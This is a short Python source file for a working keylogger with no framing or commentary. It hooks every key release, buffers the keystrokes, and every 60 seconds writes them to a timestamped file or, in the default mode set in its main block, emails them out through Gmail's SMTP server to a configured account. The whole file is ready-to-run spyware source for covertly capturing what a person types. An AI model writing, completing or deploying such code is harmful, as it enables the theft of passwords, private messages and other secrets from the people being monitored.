

import keyboard
import smtplib
from threading import Timer
from datetime import datetime

class Keylogger:

	def __init__(self, interval, report_method):
		self.interval = interval
		self.report_method = report_method
		self.log = ""
		self.start_dt = datetime.now()
		self.end_dt = datetime.now()

	def callback(self, name):
			if name == "space":
				name = " "
			elif name == "enter":
				name = "[ENTER]\n"
			elif name == "decimal":
				name = "."
			self.log += str(name)

	def update_filename(self):
		start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
		end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
		self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

	def report_to_file(self):
		with open(f"{self.filename}.txt", "w") as f:
			print(self.log, file=f)
		print(f"[+] saved {self.filename}.txt")

	def sendEmail(self, email, password):
		message = str(self.log)
		server = smtplib.SMTP(host="smtp.gmail.com", port=587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, message)
		server.quit()

	def report(self):
		EMAIL_ADDRESS = " "
		EMAIL_PASSWORD = " "

		if self.log:
			self.end_dt = datetime.now()
			self.update_filename()
			if self.report_method == "email":
				self.sendEmail(EMAIL_ADDRESS, EMAIL_PASSWORD)
			elif self.report_method == "file":
				self.report_to_file()
			self.start_dt = datetime.now()
		self.log = ""
		timer = Timer(interval=self.interval, function=self.report)
		timer.deamon = True
		timer.start()

	def start(self):
		self.start_dt = datetime.now()
		keyboard.on_release(callback=self.callback)
		self.report()
		keyboard.wait()

if __name__ == "__main__":
	keylogger = Keylogger(interval=60, report_method="email")
	keylogger.start()
